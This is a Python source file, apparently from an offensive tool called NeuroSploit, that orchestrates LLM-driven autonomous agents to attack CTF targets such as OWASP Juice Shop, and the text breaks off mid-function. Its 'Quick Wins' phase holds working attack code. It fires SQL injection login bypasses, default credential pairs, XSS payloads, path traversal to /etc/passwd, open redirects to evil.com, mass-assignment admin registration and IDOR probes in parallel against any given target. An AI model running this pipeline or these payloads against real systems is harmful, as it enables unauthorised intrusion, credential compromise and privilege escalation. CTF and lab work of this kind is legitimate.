"""
NeuroSploit v3 - Multi-Agent CTF Pipeline Coordinator

Orchestrates a pipeline of specialized agents for CTF challenges:
  Phase 1: Recon Agent (1 agent, runs to completion)
  Phase 2: LLM Analysis (single call, prioritizes + distributes vuln types)
  Phase 3: Testing Agents (N-1 agents in parallel via asyncio.gather)
  Phase 4: Aggregation (merge & deduplicate findings)
"""

import asyncio
import copy
import json
import aiohttp
from typing import Dict, List, Any, Optional, Callable, Set
from datetime import datetime


class CTFCoordinator:
    """Pipeline orchestrator for multi-agent CTF solving."""

    AGENT_LABELS = ["Alpha", "Bravo", "Charlie", "Delta", "Echo"]

    def __init__(
        self,
        target: str,
        agent_count: int,
        flag_detector: Any,
        log_callback: Callable,
        progress_callback: Callable,
        finding_callback: Callable,
        auth_headers: Optional[Dict] = None,
        custom_prompt: Optional[str] = None,
        challenge_name: Optional[str] = None,
        notes: Optional[str] = None,
        lab_context: Optional[Dict] = None,
        scan_id: Optional[str] = None,
    ):
        self.target = target
        self.agent_count = max(2, min(6, agent_count))
        self.testing_agent_count = self.agent_count - 1
        self.flag_detector = flag_detector
        self._log_callback = log_callback
        self._progress_callback = progress_callback
        self._finding_callback = finding_callback
        self.auth_headers = auth_headers or {}
        self.custom_prompt = custom_prompt
        self.challenge_name = challenge_name
        self.notes = notes
        self.lab_context = lab_context or {}
        self.scan_id = scan_id

        self._agents: List[Any] = []
        self._cancelled = False
        self._recon_data = None
        self._all_findings: List[Dict] = []
        self._baseline_solved: Set[int] = set()  # Juice Shop challenge IDs solved before testing

    def cancel(self):
        """Cancel all agents - called by stop_challenge endpoint."""
        self._cancelled = True
        for agent in self._agents:
            agent.cancel()

    async def run(self) -> Dict:
        """Execute the full CTF pipeline and return a unified report."""
        start_time = datetime.utcnow()
        await self._log_callback("info", f"[PIPELINE] Multi-agent CTF pipeline starting ({self.agent_count} agents: 1 recon + {self.testing_agent_count} testers)")

        try:
            # Snapshot Juice Shop challenge state before testing
            await self._snapshot_baseline()

            # Phase 1: Recon
            await self._progress_callback(5, "ctf_pipeline:recon")
            await self._run_recon_phase()
            if self._cancelled:
                return self._build_final_report(start_time)

            # Check if recon itself solved any challenges
            await self._check_newly_solved("recon")

            # Phase 1.5: Quick Wins — rapid generic exploit probes against common vulns
            await self._progress_callback(20, "ctf_pipeline:quick_wins")
            await self._run_quick_wins()
            await self._check_newly_solved("quick_wins")
            if self._cancelled:
                return self._build_final_report(start_time)

            # Phase 2: LLM Analysis + work distribution
            await self._progress_callback(25, "ctf_pipeline:analysis")
            assignments = await self._run_analysis_phase()
            if self._cancelled:
                return self._build_final_report(start_time)

            # Phase 3: Parallel testing
            await self._progress_callback(35, "ctf_pipeline:testing")
            await self._run_testing_phase(assignments)

            # Check for challenges solved during testing
            await self._check_newly_solved("testing")

            # Phase 4: Aggregate
            await self._progress_callback(95, "ctf_pipeline:aggregating")
            report = self._build_final_report(start_time)

            await self._progress_callback(100, "completed")
            await self._log_callback("info", f"[PIPELINE] Pipeline complete. {len(self._all_findings)} total findings.")
            return report

        except Exception as e:
            await self._log_callback("error", f"[PIPELINE] Pipeline error: {e}")
            return self._build_final_report(start_time)

    # ------------------------------------------------------------------
    # Phase 1: Recon
    # ------------------------------------------------------------------

    async def _run_recon_phase(self):
        """Run a single recon agent to populate ReconData."""
        from backend.core.autonomous_agent import AutonomousAgent, OperationMode
        from backend.core.governance import create_ctf_scope, GovernanceAgent

        await self._log_callback("info", "[PIPELINE] Phase 1/4: Recon Agent starting")

        labeled_log = self._make_labeled_log("Recon")
        scope = create_ctf_scope(self.target)
        governance = GovernanceAgent(scope, log_callback=labeled_log)

        async with AutonomousAgent(
            target=self.target,
            mode=OperationMode.FULL_AUTO,
            log_callback=labeled_log,
            progress_callback=self._make_recon_progress(),
            auth_headers=self.auth_headers,
            custom_prompt=self.custom_prompt,
            finding_callback=self._finding_callback,
            lab_context=self.lab_context,
            scan_id=self.scan_id,
            governance=governance,
        ) as agent:
            self._agents.append(agent)

            # Run recon + sandbox scan only
            await labeled_log("info", "Running reconnaissance...")
            await asyncio.gather(
                agent._run_recon_only(),
                agent._run_sandbox_scan(),
            )

            # Deep-copy the populated recon data
            self._recon_data = copy.deepcopy(agent.recon)

            recon_summary = (
                f"endpoints={len(self._recon_data.endpoints)}, "
                f"params={len(self._recon_data.parameters)}, "
                f"techs={len(self._recon_data.technologies)}, "
                f"forms={len(self._recon_data.forms)}"
            )
            await self._log_callback("info", f"[PIPELINE] Recon complete: {recon_summary}")

            self._agents.remove(agent)

    # ------------------------------------------------------------------
    # Phase 2: LLM Analysis
    # ------------------------------------------------------------------

    async def _run_analysis_phase(self) -> List[List[str]]:
        """Use LLM to prioritize vuln types, then round-robin distribute."""
        from backend.core.autonomous_agent import LLMClient

        await self._log_callback("info", f"[PIPELINE] Phase 2/4: LLM Analysis — prioritizing attack vectors for {self.testing_agent_count} testers")

        priority_vulns = await self._get_prioritized_vulns()

        # Round-robin distribute to testing agents
        assignments: List[List[str]] = [[] for _ in range(self.testing_agent_count)]
        for i, vtype in enumerate(priority_vulns):
            assignments[i % self.testing_agent_count].append(vtype)

        for i, assignment in enumerate(assignments):
            label = self.AGENT_LABELS[i] if i < len(self.AGENT_LABELS) else f"Agent-{i}"
            await self._log_callback("info", f"[PIPELINE] {label}: assigned {len(assignment)} vuln types")

        return assignments

    async def _get_prioritized_vulns(self) -> List[str]:
        """Ask LLM to prioritize vuln types based on recon data, with fallback."""
        from backend.core.autonomous_agent import LLMClient, AutonomousAgent

        # Build context from recon
        recon_summary = ""
        if self._recon_data:
            techs = ", ".join(self._recon_data.technologies[:10]) if self._recon_data.technologies else "unknown"
            endpoints_sample = [
                (e if isinstance(e, str) else e.get("url", ""))
                for e in self._recon_data.endpoints[:15]
            ]
            forms_count = len(self._recon_data.forms)
            params_count = sum(len(v) for v in self._recon_data.parameters.values())
            recon_summary = (
                f"Technologies: {techs}\n"
                f"Endpoints ({len(self._recon_data.endpoints)}): {json.dumps(endpoints_sample)}\n"
                f"Forms: {forms_count}, Parameters: {params_count}\n"
                f"API endpoints: {len(self._recon_data.api_endpoints)}"
            )

        # Get default plan for the full vuln list
        default_plan = AutonomousAgent._static_default_attack_plan()

        prompt = (
            "You are a CTF challenge solver. Based on the recon data below, "
            "prioritize which vulnerability types to test FIRST.\n\n"
            f"Target: {self.target}\n"
            f"Recon data:\n{recon_summary}\n\n"
            f"Available vuln types (in default priority order):\n"
            f"{json.dumps(default_plan, indent=2)}\n\n"
            "Return a JSON array of vulnerability type strings, ordered by highest "
            "probability of success for this specific target. Put the most likely "
            "vulns first. Include ALL types. Return ONLY the JSON array, no explanation."
        )

        try:
            llm = LLMClient()
            if not llm.client:
                raise Exception("No LLM available")

            response = await llm.generate(prompt, system="You are an expert CTF solver. Return only valid JSON.")
            # Parse JSON array from response
            text = response.strip()
            # Handle markdown code blocks
            if text.startswith("```"):
                text = text.split("\n", 1)[1] if "\n" in text else text[3:]
                text = text.rsplit("```", 1)[0]
            parsed = json.loads(text.strip())
            if isinstance(parsed, list) and len(parsed) > 10:
                await self._log_callback("info", f"[PIPELINE] LLM prioritized {len(parsed)} vuln types")
                return parsed
        except Exception as e:
            await self._log_callback("warning", f"[PIPELINE] LLM prioritization failed ({e}), using defaults")

        return default_plan

    # ------------------------------------------------------------------
    # Phase 3: Parallel Testing
    # ------------------------------------------------------------------

    async def _run_testing_phase(self, assignments: List[List[str]]):
        """Launch N-1 testing agents in parallel with periodic challenge polling."""
        from backend.core.autonomous_agent import AutonomousAgent, OperationMode
        from backend.core.governance import create_ctf_scope, GovernanceAgent

        await self._log_callback("info", f"[PIPELINE] Phase 3/4: Launching {self.testing_agent_count} parallel testing agents")

        tasks = []
        for i, assignment in enumerate(assignments):
            label = self.AGENT_LABELS[i] if i < len(self.AGENT_LABELS) else f"Agent-{i}"
            tasks.append(self._run_single_tester(i, label, assignment))

        # Run agents + periodic challenge polling concurrently
        async def periodic_challenge_poll():
            """Poll Juice Shop /api/Challenges every 60 seconds during testing."""
            while not self._cancelled:
                await asyncio.sleep(60)
                if self._cancelled:
                    break
                await self._check_newly_solved("testing")

        poll_task = asyncio.create_task(periodic_challenge_poll())
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
        finally:
            poll_task.cancel()
            try:
                await poll_task
            except asyncio.CancelledError:
                pass

        for i, result in enumerate(results):
            label = self.AGENT_LABELS[i] if i < len(self.AGENT_LABELS) else f"Agent-{i}"
            if isinstance(result, Exception):
                await self._log_callback("error", f"[PIPELINE] {label} failed: {result}")

    async def _run_single_tester(self, index: int, label: str, vuln_types: List[str]):
        """Run a single testing agent with preset recon and focused vuln types."""
        from backend.core.autonomous_agent import AutonomousAgent, OperationMode
        from backend.core.governance import create_ctf_scope, GovernanceAgent

        labeled_log = self._make_labeled_log(label)
        labeled_finding = self._make_labeled_finding(label)
        scope = create_ctf_scope(self.target)
        governance = GovernanceAgent(scope, log_callback=labeled_log)

        await labeled_log("info", f"Starting with {len(vuln_types)} vuln types")

        async with AutonomousAgent(
            target=self.target,
            mode=OperationMode.FULL_AUTO,
            log_callback=labeled_log,
            progress_callback=self._make_testing_progress(index),
            auth_headers=self.auth_headers,
            custom_prompt=self.custom_prompt,
            finding_callback=labeled_finding,
            lab_context=self.lab_context,
            scan_id=self.scan_id,
            governance=governance,
            preset_recon=copy.deepcopy(self._recon_data),
            focus_vuln_types=vuln_types,
            agent_label=label,
        ) as agent:
            self._agents.append(agent)

            try:
                report = await agent.run()
                findings = report.get("findings", [])
                self._all_findings.extend(findings)
                await labeled_log("info", f"Completed: {len(findings)} findings")
            except Exception as e:
                await labeled_log("error", f"Agent error: {e}")
            finally:
                if agent in self._agents:
                    self._agents.remove(agent)

    # ------------------------------------------------------------------
    # Phase 4: Aggregation
    # ------------------------------------------------------------------

    def _build_final_report(self, start_time: datetime) -> Dict:
        """Merge and deduplicate findings from all agents."""
        # Deduplicate by (vuln_type, endpoint, parameter)
        seen = set()
        unique_findings = []
        for f in self._all_findings:
            key = (
                f.get("vulnerability_type", ""),
                f.get("affected_endpoint", f.get("url", "")),
                f.get("parameter", ""),
            )
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)

        duration = (datetime.utcnow() - start_time).total_seconds()

        report = {
            "findings": unique_findings,
            "recon": {
                "endpoints": [
                    (e if isinstance(e, str) else e)
                    for e in (self._recon_data.endpoints if self._recon_data else [])
                ],
                "technologies": self._recon_data.technologies if self._recon_data else [],
                "parameters": self._recon_data.parameters if self._recon_data else {},
            },
            "executive_summary": (
                f"Multi-agent CTF pipeline ({self.agent_count} agents) completed in {duration:.0f}s. "
                f"Found {len(unique_findings)} unique findings across {self.testing_agent_count} parallel testers."
            ),
            "pipeline_info": {
                "agent_count": self.agent_count,
                "testing_agents": self.testing_agent_count,
                "total_findings_raw": len(self._all_findings),
                "unique_findings": len(unique_findings),
                "duration_seconds": round(duration, 1),
            },
        }

        # Include CTF flag metrics if available
        if self.flag_detector:
            report["ctf_flags"] = self.flag_detector.to_serializable()
            report["ctf_metrics"] = self.flag_detector.get_metrics()

        return report

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _make_labeled_log(self, label: str) -> Callable:
        """Return a log callback that prefixes messages with [Label]."""
        original = self._log_callback

        async def labeled_log(level: str, message: str):
            await original(level, f"[{label}] {message}")

        return labeled_log

    def _make_labeled_finding(self, label: str) -> Callable:
        """Return a finding callback that tracks the agent label."""
        original = self._finding_callback

        async def labeled_finding(finding: Dict):
            finding["agent_label"] = label
            self._all_findings.append(finding)
            await original(finding)

        return labeled_finding

    def _make_recon_progress(self) -> Callable:
        """Map recon agent progress (0-100) to pipeline progress (5-25)."""
        original = self._progress_callback

        async def recon_progress(progress: int, phase: str):
            mapped = 5 + int(progress * 0.2)  # 5-25 range
            await original(mapped, f"ctf_pipeline:recon")

        return recon_progress

    def _make_testing_progress(self, index: int) -> Callable:
        """Map testing agent progress (0-100) to pipeline progress (35-95)."""
        original = self._progress_callback

        async def testing_progress(progress: int, phase: str):
            # Each agent contributes proportionally within 35-95 range
            per_agent_range = 60 / self.testing_agent_count
            base = 35 + int(index * per_agent_range)
            mapped = base + int(progress * per_agent_range / 100)
            await original(min(mapped, 95), f"ctf_pipeline:testing")

        return testing_progress

    # ------------------------------------------------------------------
    # Phase 1.5: Quick Wins — generic rapid exploit probes
    # ------------------------------------------------------------------

    async def _run_quick_wins(self):
        """Run fast, generic exploit probes for common low-hanging-fruit vulns.

        This phase fires targeted HTTP requests in parallel to quickly find:
        - SQLi on login/search forms
        - Default/common credentials
        - Admin panel access
        - Sensitive file exposure
        - IDOR on sequential IDs
        - XSS on search/input parameters
        - Open redirects
        - API information disclosure
        - Path traversal
        - Missing access control on privileged endpoints
        """
        await self._log_callback("info", "[PIPELINE] Phase 1.5: Quick Wins — rapid exploit probes")

        base = self.target.rstrip("/")
        endpoints = []
        if self._recon_data:
            endpoints = [
                (e if isinstance(e, str) else e.get("url", ""))
                for e in self._recon_data.endpoints[:80]
            ]
        techs = set()
        if self._recon_data:
            techs = {t.lower() for t in self._recon_data.technologies}

        solved_before = len(self._baseline_solved)

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=20),
            timeout=aiohttp.ClientTimeout(total=10),
            headers={**self.auth_headers, "User-Agent": "Mozilla/5.0 NeuroSploit/3.0"},
        ) as session:
            probes = []

            # ── 1. SQLi on login/auth endpoints ──
            login_paths = [p for p in endpoints if any(k in p.lower() for k in ("login", "auth", "signin", "session"))]
            if not login_paths:
                login_paths = [f"{base}/rest/user/login", f"{base}/api/login", f"{base}/login", f"{base}/api/auth/login"]
            for url in login_paths[:4]:
                probes.append(self._probe_sqli_login(session, url))

            # ── 2. Default credentials ──
            probes.append(self._probe_default_creds(session, login_paths[:2] if login_paths else [f"{base}/rest/user/login"]))

            # ── 3. Admin / privileged endpoints ──
            admin_paths = [p for p in endpoints if any(k in p.lower() for k in ("admin", "dashboard", "manage", "console", "configuration"))]
            admin_paths += [f"{base}/admin", f"{base}/administration", f"{base}/api/admin"]
            probes.append(self._probe_admin_access(session, list(set(admin_paths))[:8]))

            # ── 4. Sensitive file disclosure ──
            probes.append(self._probe_sensitive_files(session, base))

            # ── 5. Search/parameter XSS + SQLi ──
            search_paths = [p for p in endpoints if any(k in p.lower() for k in ("search", "q=", "query", "find"))]
            param_endpoints = list(self._recon_data.parameters.keys())[:10] if self._recon_data else []
            probes.append(self._probe_search_injection(session, base, search_paths + param_endpoints))

            # ── 6. IDOR on API resources ──
            api_paths = [p for p in endpoints if any(k in p.lower() for k in ("/api/", "/rest/", "/v1/", "/v2/"))]
            probes.append(self._probe_idor(session, api_paths[:15]))

            # ── 7. Open redirect ──
            redirect_paths = [p for p in endpoints if any(k in p.lower() for k in ("redirect", "url=", "next=", "return", "goto"))]
            redirect_paths += [f"{base}/redirect"]
            probes.append(self._probe_open_redirect(session, list(set(redirect_paths))[:5]))

            # ── 8. Path traversal ──
            file_paths = [p for p in endpoints if any(k in p.lower() for k in ("file", "download", "read", "ftp", "doc", "load", "fetch"))]
            file_paths += [f"{base}/ftp"]
            probes.append(self._probe_path_traversal(session, list(set(file_paths))[:6]))

            # ── 9. API info disclosure (Swagger, GraphQL introspection, config) ──
            probes.append(self._probe_api_disclosure(session, base))

            # ── 10. Registration/signup abuse ──
            reg_paths = [p for p in endpoints if any(k in p.lower() for k in ("user", "register", "signup", "account"))]
            probes.append(self._probe_registration_abuse(session, base, reg_paths[:5]))

            # Fire all probes in parallel
            results = await asyncio.gather(*probes, return_exceptions=True)

            wins = 0
            for result in results:
                if isinstance(result, Exception):
                    continue
                if isinstance(result, list):
                    for finding in result:
                        if finding:
                            wins += 1
                            self._all_findings.append(finding)
                            await self._finding_callback(finding)
                elif result:
                    wins += 1
                    self._all_findings.append(result)
                    await self._finding_callback(result)

        # Check challenges after quick wins
        solved_after = await self._poll_challenges()
        new_solves = len({cid for cid, c in solved_after.items() if c.get("solved")} - self._baseline_solved) if solved_after else 0
        await self._log_callback("info", f"[PIPELINE] Quick Wins complete: {wins} findings, {new_solves} new challenges solved")

    # ── Quick-win probe implementations ──

    async def _probe_sqli_login(self, session, url: str) -> Optional[Dict]:
        """Try common SQLi payloads on a login endpoint."""
        sqli_payloads = [
            {"email": "' OR 1=1--", "password": "x"},
            {"email": "admin'--", "password": "x"},
            {"username": "' OR 1=1--", "password": "x"},
            {"email": "' OR '1'='1'--", "password": "anything"},
            {"user": "admin' OR '1'='1'--", "pass": "x"},
        ]
        for payload in sqli_payloads:
            try:
                async with session.post(url, json=payload, ssl=False) as resp:
                    body = await resp.text()
                    if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success", "welcome", "session")):
                        await self._log_callback("warning", f"[QuickWin] SQLi login bypass at {url} with {list(payload.values())[0]}")
                        return self._make_finding("SQL Injection - Auth Bypass", "sqli_auth_bypass", "critical",
                                                   url, list(payload.keys())[0], str(list(payload.values())[0]),
                                                   f"Login bypassed with SQLi. Status: {resp.status}", "POST")
                # Also try form-encoded
                async with session.post(url, data=payload, ssl=False) as resp:
                    body = await resp.text()
                    if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success", "welcome", "session")):
                        await self._log_callback("warning", f"[QuickWin] SQLi login bypass (form) at {url}")
                        return self._make_finding("SQL Injection - Auth Bypass", "sqli_auth_bypass", "critical",
                                                   url, list(payload.keys())[0], str(list(payload.values())[0]),
                                                   f"Login bypassed with SQLi (form). Status: {resp.status}", "POST")
            except Exception:
                continue
        return None

    async def _probe_default_creds(self, session, login_urls: List[str]) -> List[Dict]:
        """Try common default credential pairs."""
        cred_pairs = [
            ("admin@juice-sh.op", "admin123"),
            ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
            ("admin", "Password1"), ("root", "root"), ("test", "test"),
            ("admin@admin.com", "admin"), ("user", "user"), ("demo", "demo"),
        ]
        findings = []
        for url in login_urls[:2]:
            for user, pw in cred_pairs:
                try:
                    for payload in [
                        {"email": user, "password": pw},
                        {"username": user, "password": pw},
                    ]:
                        async with session.post(url, json=payload, ssl=False) as resp:
                            body = await resp.text()
                            if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success")):
                                await self._log_callback("warning", f"[QuickWin] Default creds work: {user} at {url}")
                                findings.append(self._make_finding(
                                    f"Default Credentials ({user})", "default_credentials", "critical",
                                    url, "email/username", f"{user}:{pw}",
                                    f"Login succeeded with default credentials. Status: {resp.status}", "POST"))
                                break  # Don't test more payloads for this user
                except Exception:
                    continue
        return findings

    async def _probe_admin_access(self, session, urls: List[str]) -> List[Dict]:
        """Check if admin/privileged pages are accessible without auth."""
        findings = []
        for url in urls:
            try:
                async with session.get(url, ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    if resp.status == 200 and len(body) > 200:
                        body_lower = body.lower()
                        if any(k in body_lower for k in ("admin", "dashboard", "management", "configuration", "user list")):
                            if not any(k in body_lower for k in ("login", "sign in", "unauthorized", "forbidden")):
                                await self._log_callback("warning", f"[QuickWin] Admin panel accessible: {url}")
                                findings.append(self._make_finding(
                                    "Exposed Admin Panel", "broken_access_control", "high",
                                    url, "", "", f"Admin panel accessible without auth. Status: {resp.status}", "GET"))
            except Exception:
                continue
        return findings

    async def _probe_sensitive_files(self, session, base: str) -> List[Dict]:
        """Probe for sensitive files and directories."""
        paths = [
            "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD", "/backup/",
            "/.well-known/security.txt", "/security.txt",
            "/api/swagger.json", "/api-docs", "/swagger-ui.html", "/swagger/",
            "/graphql", "/.DS_Store", "/server-info", "/server-status",
            "/metrics", "/prometheus", "/actuator", "/actuator/health",
            "/debug", "/trace", "/console", "/phpinfo.php",
            "/wp-login.php", "/wp-admin/", "/elmah.axd",
            "/ftp/", "/backup.sql", "/dump.sql", "/db.sqlite",
            "/config.json", "/config.yml", "/application.yml",
            "/package.json", "/composer.json", "/Gemfile",
        ]
        findings = []
        # Fire in batches to avoid overwhelming target
        for i in range(0, len(paths), 10):
            batch = paths[i:i+10]
            tasks = []
            for path in batch:
                tasks.append(self._check_sensitive_path(session, f"{base}{path}"))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if r and not isinstance(r, Exception):
                    findings.append(r)
        return findings

    async def _check_sensitive_path(self, session, url: str) -> Optional[Dict]:
        """Check if a sensitive path returns interesting content."""
        try:
            async with session.get(url, ssl=False, allow_redirects=False) as resp:
                if resp.status == 200:
                    body = await resp.text()
                    if len(body) > 50 and not any(k in body.lower() for k in ("not found", "404", "error")):
                        path = url.split("/", 3)[-1] if "/" in url[8:] else url
                        await self._log_callback("info", f"[QuickWin] Sensitive file found: {url} ({len(body)} bytes)")
                        return self._make_finding(
                            f"Sensitive File Exposed ({path})", "information_disclosure", "medium",
                            url, "", "", f"Sensitive file accessible. Size: {len(body)} bytes", "GET")
        except Exception:
            pass
        return None

    async def _probe_search_injection(self, session, base: str, search_urls: List[str]) -> List[Dict]:
        """Test search/query parameters for XSS and SQLi."""
        findings = []
        xss_payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            "{{7*7}}",  # SSTI
        ]
        sqli_payloads = ["' OR 1=1--", "1 UNION SELECT NULL--", "' AND '1'='1"]

        # Discover search-like endpoints
        if not search_urls:
            search_urls = [f"{base}/search", f"{base}/rest/products/search", f"{base}/api/search"]

        for url in search_urls[:6]:
            parsed = url.split("?")[0]
            # XSS
            for payload in xss_payloads:
                try:
                    test_url = f"{parsed}?q={payload}"
                    async with session.get(test_url, ssl=False) as resp:
                        body = await resp.text()
                        if resp.status == 200 and payload in body:
                            await self._log_callback("warning", f"[QuickWin] XSS reflected at {parsed}?q=")
                            findings.append(self._make_finding(
                                "Reflected XSS", "xss_reflected", "high",
                                parsed, "q", payload, f"Payload reflected in response", "GET"))
                            break
                except Exception:
                    continue
            # SQLi
            for payload in sqli_payloads:
                try:
                    test_url = f"{parsed}?q={payload}"
                    async with session.get(test_url, ssl=False) as resp:
                        body = await resp.text()
                        if resp.status == 200 and any(k in body.lower() for k in ("sql", "syntax", "query", "sqlite", "mysql", "postgresql")):
                            await self._log_callback("warning", f"[QuickWin] SQLi error at {parsed}?q=")
                            findings.append(self._make_finding(
                                "SQL Injection - Error Based", "sqli_error", "critical",
                                parsed, "q", payload, f"SQL error in response", "GET"))
                            break
                except Exception:
                    continue
        return findings

    async def _probe_idor(self, session, api_urls: List[str]) -> List[Dict]:
        """Test API endpoints for IDOR by accessing sequential resource IDs."""
        findings = []
        for url in api_urls:
            # Try appending /1, /2 etc. to API paths
            base_url = url.rstrip("/")
            try:
                # Get resource as ID 1
                async with session.get(f"{base_url}/1", ssl=False) as resp1:
                    if resp1.status != 200:
                        continue
                    body1 = await resp1.text()
                # Get resource as ID 2
                async with session.get(f"{base_url}/2", ssl=False) as resp2:
                    if resp2.status == 200:
                        body2 = await resp2.text()
                        if body1 != body2 and len(body2) > 50:
                            # Different content for different IDs — potential IDOR
                            await self._log_callback("warning", f"[QuickWin] IDOR: {base_url}/1 vs /2 return different data")
                            findings.append(self._make_finding(
                                "Insecure Direct Object Reference", "idor", "high",
                                base_url, "id", "1, 2", f"Different user data accessible via sequential IDs", "GET"))
            except Exception:
                continue
        return findings

    async def _probe_open_redirect(self, session, urls: List[str]) -> List[Dict]:
        """Test for open redirect vulnerabilities."""
        findings = []
        redirect_params = ["to", "url", "next", "redirect", "return_to", "goto", "dest"]
        target_urls = ["https://evil.com", "//evil.com", "https://google.com"]

        for url in urls:
            base_url = url.split("?")[0]
            for param in redirect_params:
                for target in target_urls:
                    try:
                        test_url = f"{base_url}?{param}={target}"
                        async with session.get(test_url, ssl=False, allow_redirects=False) as resp:
                            location = resp.headers.get("Location", "")
                            if resp.status in (301, 302, 303, 307, 308) and "evil.com" in location:
                                await self._log_callback("warning", f"[QuickWin] Open redirect: {base_url}?{param}=")
                                findings.append(self._make_finding(
                                    "Open Redirect", "open_redirect", "medium",
                                    base_url, param, target, f"Redirects to external URL: {location}", "GET"))
                                break
                    except Exception:
                        continue
        return findings

    async def _probe_path_traversal(self, session, urls: List[str]) -> List[Dict]:
        """Test for path traversal / local file inclusion."""
        findings = []
        traversal_payloads = [
            "../../../etc/passwd", "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd", "..\\..\\..\\windows\\win.ini",
        ]
        file_params = ["file", "path", "name", "doc", "download", "filename", "load"]

        for url in urls:
            base_url = url.split("?")[0]
            # Try as query param
            for param in file_params:
                for payload in traversal_payloads:
                    try:
                        test_url = f"{base_url}?{param}={payload}"
                        async with session.get(test_url, ssl=False) as resp:
                            body = await resp.text()
                            if resp.status == 200 and ("root:" in body or "[extensions]" in body):
                                await self._log_callback("warning", f"[QuickWin] Path traversal: {base_url}?{param}=")
                                findings.append(self._make_finding(
                                    "Path Traversal / LFI", "path_traversal", "critical",
                                    base_url, param, payload, f"File contents leaked", "GET"))
                                return findings
                    except Exception:
                        continue
            # Try as path suffix
            for payload in traversal_payloads[:2]:
                try:
                    test_url = f"{base_url}/{payload}"
                    async with session.get(test_url, ssl=False) as resp:
                        body = await resp.text()
                        if resp.status == 200 and ("root:" in body or "[extensions]" in body):
                            await self._log_callback("warning", f"[QuickWin] Path traversal (path): {test_url[:80]}")
                            findings.append(self._make_finding(
                                "Path Traversal / LFI", "path_traversal", "critical",
                                base_url, "path", payload, f"File contents leaked via path", "GET"))
                            return findings
                except Exception:
                    continue
        return findings

    async def _probe_api_disclosure(self, session, base: str) -> List[Dict]:
        """Check for API documentation and information disclosure."""
        findings = []
        # GraphQL introspection
        introspection = '{"query":"{ __schema { types { name } } }"}'
        gql_urls = [f"{base}/graphql", f"{base}/api/graphql", f"{base}/gql"]
        for url in gql_urls:
            try:
                async with session.post(url, data=introspection, headers={"Content-Type": "application/json"}, ssl=False) as resp:
                    body = await resp.text()
                    if resp.status == 200 and "__schema" in body:
                        await self._log_callback("warning", f"[QuickWin] GraphQL introspection enabled: {url}")
                        findings.append(self._make_finding(
                            "GraphQL Introspection Enabled", "graphql_introspection", "medium",
                            url, "", introspection, f"Full schema accessible", "POST"))
                        break
            except Exception:
                continue
        return findings

    async def _probe_registration_abuse(self, session, base: str, reg_urls: List[str]) -> List[Dict]:
        """Test registration endpoints for abuse (mass assignment, empty registration, etc.)."""
        findings = []
        if not reg_urls:
            reg_urls = [f"{base}/api/Users", f"{base}/api/users", f"{base}/api/register"]

        for url in reg_urls[:3]:
            # Mass assignment — try to register as admin
            payloads = [
                {"email": f"test_{int(asyncio.get_event_loop().time())}@test.com", "password": "Test1234!", "role": "admin"},
                {"email": f"test2_{int(asyncio.get_event_loop().time())}@test.com", "password": "Test1234!", "isAdmin": True},
                {"email": "", "password": ""},  # Empty registration
            ]
            for payload in payloads:
                try:
                    async with session.post(url, json=payload, ssl=False) as resp:
                        body = await resp.text()
                        if resp.status in (200, 201):
                            body_lower = body.lower()
                            if '"role":"admin"' in body or '"isAdmin":true' in body.replace(" ", ""):
                                await self._log_callback("warning", f"[QuickWin] Mass assignment — admin role at {url}")
                                findings.append(self._make_finding(
                                    "Mass Assignment - Privilege Escalation", "mass_assignment", "critical",
                                    url, "role/isAdmin", json.dumps(payload), f"Registered with admin privileges", "POST"))
                            elif not payload.get("email") and "id" in body_lower:
                                await self._log_callback("warning", f"[QuickWin] Empty user registration at {url}")
                                findings.append(self._make_finding(
                                    "Empty User Registration", "improper_input_validation", "medium",
                                    url, "email", "", f"Registered with empty credentials", "POST"))
                except Exception:
                    continue
        return findings

    def _make_finding(self, title: str, vuln_type: str, severity: str,
                      url: str, parameter: str, payload: str,
                      evidence: str, method: str = "GET") -> Dict:
        """Create a standardized finding dict."""
        return {
            "title": title,
            "vulnerability_type": vuln_type,
            "severity": severity,
            "affected_endpoint": url,
            "parameter": parameter,
            "payload": payload,
            "evidence": evidence,
            "request_method": method,
            "agent_label": "QuickWin",
            "cvss_score": {"critical": 9.8, "high": 7.5, "medium": 5.0, "low": 3.0, "info": 0.0}.get(severity, 5.0),
            "cwe_id": "",
            "description": evidence,
            "impact": f"{severity.title()} severity {vuln_type} vulnerability",
            "remediation": f"Fix {vuln_type} vulnerability",
            "references": [],
        }

    # ------------------------------------------------------------------
    # Juice Shop Challenge Tracking
    # ------------------------------------------------------------------

    async def _poll_challenges(self) -> Dict[int, Dict]:
        """Poll Juice Shop /api/Challenges endpoint for challenge state."""
        try:
            async with aiohttp.ClientSession() as session:
                url = f"{self.target.rstrip('/')}/api/Challenges"
                async with session.get(url, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        challenges = data.get("data", [])
                        return {c["id"]: c for c in challenges}
        except Exception as e:
            await self._log_callback("debug", f"[PIPELINE] Challenge poll failed: {e}")
        return {}

    async def _snapshot_baseline(self):
        """Take baseline snapshot of solved challenges before testing."""
        challenges = await self._poll_challenges()
        if challenges:
            self._baseline_solved = {cid for cid, c in challenges.items() if c.get("solved")}
            total = len(challenges)
            solved = len(self._baseline_solved)
            await self._log_callback("info", f"[PIPELINE] Juice Shop detected: {total} challenges, {solved} pre-solved")
        else:
            await self._log_callback("debug", "[PIPELINE] No Juice Shop challenge API detected (not a Juice Shop target)")

    async def _check_newly_solved(self, phase_name: str = "testing"):
        """Check for newly solved challenges and register them as flags."""
        if not self._baseline_solved and not await self._poll_challenges():
            return  # Not a Juice Shop target

        challenges = await self._poll_challenges()
        if not challenges:
            return

        current_solved = {cid for cid, c in challenges.items() if c.get("solved")}
        newly_solved = current_solved - self._baseline_solved

        for cid in newly_solved:
            c = challenges[cid]
